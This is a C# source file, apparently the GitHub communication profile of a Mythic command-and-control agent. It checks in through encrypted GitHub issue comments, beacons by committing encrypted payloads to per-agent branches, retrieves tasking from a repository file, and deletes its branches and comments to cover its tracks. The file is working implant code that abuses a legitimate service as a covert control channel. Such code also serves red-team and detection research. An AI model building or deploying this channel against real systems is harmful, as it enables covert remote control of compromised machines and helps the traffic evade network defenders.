using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using Octokit;
using System.Text;
using System.Text.Json;

namespace Agent.Profiles
{
    public class GitHub : IProfile
    {
        private IAgentConfig agentConfig { get; set; }
        private ICryptoManager crypt { get; set; }
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private CheckinResponse cir;

        private bool checkedin = false;
        private int currentAttempt = 0;
        private int maxAttempts = 10;

        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;

        private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
        private static readonly GitHubClient client = new GitHubClient(new ProductHeaderValue("ApiClient"));
        private readonly string GITHUB_TOKEN;
        private readonly string OWNER;
        private readonly string REPO;
        private readonly int SERVER_ISSUE;
        private readonly int CLIENT_ISSUE;
        
        public GitHub(IAgentConfig config, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
        {
            this.crypt = crypto;
            this.agentConfig = config;
            this.logger = logger;
            this.messageManager = messageManager;
            GitHubChannelOptions? opts = null;
            try
            {
                opts = JsonSerializer.Deserialize(
                    ChannelConfig.Decode(),
                    GitHubChannelOptionsJsonContext.Default.GitHubChannelOptions);
            }
            catch (Exception ex)
            {
                this.logger.Log($"Failed to deserialize GitHub channel options: {ex.Message}");
            }
            opts ??= new GitHubChannelOptions();
            GITHUB_TOKEN = opts.PersonalAccessToken ?? string.Empty;
            OWNER = opts.GithubUsername ?? string.Empty;
            REPO = opts.GithubRepo ?? string.Empty;
            SERVER_ISSUE = opts.ServerIssueNumber;
            CLIENT_ISSUE = opts.ClientIssueNumber;

            if (!string.IsNullOrEmpty(GITHUB_TOKEN))
            {
                client.Credentials = new Credentials(GITHUB_TOKEN);
            }
        }

        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            Console.WriteLine($"Checkin UUID: {agentConfig.uuid}");

            string msg = JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin);
            string checkin_msg = this.crypt.Encrypt(msg);
            try
            {
                await client.Issue.Comment.Create(OWNER, REPO, CLIENT_ISSUE, checkin_msg);
            }
            catch (Exception e)
            {
                Console.WriteLine($"Error: {e.Message}");
            }

            const int maxCheckinAttempts = 3;
            for (int attempt = 0; attempt <= maxCheckinAttempts; attempt++)
            {
                // Relax.. wait for Mythic to post a checkin response (cir) to GitHub for the agent to retrieve 
                await Task.Delay(3000, cancellationTokenSource.Token);

                List<string> comments = await GetComments();
                CheckinResponse? response = comments
                    .Select(ParseCheckinResponse)
                    .FirstOrDefault(candidate => candidate is not null);
                if (response is not null)
                {
                    this.checkedin = true;
                    this.cir = response;
                    return this.cir;
                }
            }
            
            return new CheckinResponse()
            {
                status = "failed"
            };
        }

        public async Task StartBeacon()
        {
            //Main beacon loop handled here
            Console.WriteLine($"Start beacon UUID: {agentConfig.uuid}");

            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                await CreateAgentBranchAsync();
                string agentSha = await DeliverToServerBranchAsync();
                await WaitForMythicResponseAsync(agentSha);
                await ReadTaskingFromBranchAsync();

                if (this.currentAttempt >= this.maxAttempts)
                {
                    this.cancellationTokenSource.Cancel();
                }

                await DeleteAgentBranchAsync();
                await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000, cancellationTokenSource.Token);
            }
        }

        private async Task CreateAgentBranchAsync()
        {
            Console.WriteLine("Creating branch");
            var baseRef = await client.Git.Reference.Get(OWNER, REPO, "heads/main");
            var newBranchRef = new NewReference($"refs/heads/{agentConfig.uuid}", baseRef.Object.Sha);
            await client.Git.Reference.Create(OWNER, REPO, newBranchRef);
        }

        private async Task<string> DeliverToServerBranchAsync()
        {
            Console.WriteLine("Checking In");
            try
            {
                string agentSha = await messageManager.DeliverAsync(
                    async payload =>
                    {
                        string message = this.crypt.Encrypt(payload);
                        var createRequest = new CreateFileRequest(agentConfig.uuid, message, agentConfig.uuid);
                        var result = await client.Repository.Content.CreateFile(OWNER, REPO, "server.txt", createRequest);
                        return result.Commit.Sha;
                    },
                    sha => !string.IsNullOrEmpty(sha));
                this.currentAttempt = string.IsNullOrEmpty(agentSha) ? this.currentAttempt + 1 : 0;
                return agentSha;
            }
            catch (Exception e)
            {
                this.currentAttempt++;
                Console.WriteLine($"{e.Message}");
                return "";
            }
        }

        private async Task WaitForMythicResponseAsync(string agentSha)
        {
            Console.WriteLine("Waiting for Mythic to push back");
            const int maxPollAttempts = 3;
            for (int attempt = 0; attempt < maxPollAttempts; attempt++)
            {
                await Task.Delay(3000, cancellationTokenSource.Token);
                try
                {
                    var branch = await client.Repository.Branch.Get(OWNER, REPO, agentConfig.uuid);
                    if (branch.Commit.Sha != agentSha)
                    {
                        return;
                    }
                }
                catch (NotFoundException)
                {
                    Console.WriteLine("Mythic has not pushed client.txt yet");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"An error occurred: {ex.Message}");
                }
            }
        }

        private async Task ReadTaskingFromBranchAsync()
        {
            Console.WriteLine("Getting response back from Mythic");
            try
            {
                var fileContents = await client.Repository.Content.GetAllContentsByRef(OWNER, REPO, "client.txt", agentConfig.uuid);
                string mythResp = this.crypt.Decrypt(fileContents[0].Content);
                GetTaskingResponse? gtr = ParseTaskingResponse(mythResp);
                if (gtr is not null)
                {
                    this.SetTaskingReceived?.Invoke(this, new TaskingReceivedArgs(gtr));
                }
            }
            catch (NotFoundException)
            {
                Console.WriteLine($"File 'client.txt' not found in repository '{REPO}' on branch '{agentConfig.uuid}'.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        private async Task DeleteAgentBranchAsync()
        {
            Console.WriteLine("Deleting branch");
            try
            {
                await client.Git.Reference.Delete(OWNER, REPO, $"refs/heads/{agentConfig.uuid}");
                Console.WriteLine($"Branch '{agentConfig.uuid}' deleted successfully.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred while deleting the branch: {ex.Message}");
            }
        }

        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();
            return true;
        }

        private CheckinResponse? ParseCheckinResponse(string content)
        {
            try
            {
                CheckinResponse? response = JsonSerializer.Deserialize(content, CheckinResponseJsonContext.Default.CheckinResponse);
                return CheckinResponseValidation.IsSuccessful(response) ? response : null;
            }
            catch (JsonException)
            {
                return null;
            }
        }

        private GetTaskingResponse? ParseTaskingResponse(string content)
        {
            GetTaskingResponse? response = JsonSerializer.Deserialize(content, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
            return response?.action == "get_tasking" ? response : null;
        }

        private bool TryDecodeOwnedComment(string body, out string plaintext)
        {
            plaintext = string.Empty;
            try
            {
                string decoded = Encoding.UTF8.GetString(Convert.FromBase64String(body));
                if (decoded.Length < 36 || decoded[..36] != agentConfig.uuid)
                {
                    return false;
                }

                plaintext = crypt.Decrypt(body);
                return true;
            }
            catch
            {
                return false;
            }
        }

        internal async Task<List<string>> GetComments()
        {
            var comments = new List<string>();

            try
            {
                var all_comments = await client.Issue.Comment.GetAllForIssue(OWNER, REPO, SERVER_ISSUE);
                foreach (var comment in all_comments)
                {
                    if (!TryDecodeOwnedComment(comment.Body, out string plaintext))
                    {
                        continue;
                    }

                    comments.Add(plaintext);
                    try
                    {
                        await client.Issue.Comment.Delete(OWNER, REPO, comment.Id);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"Error: {e.Message}");
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"Error: {e.Message}");
            }
            return comments;
        }
    }
}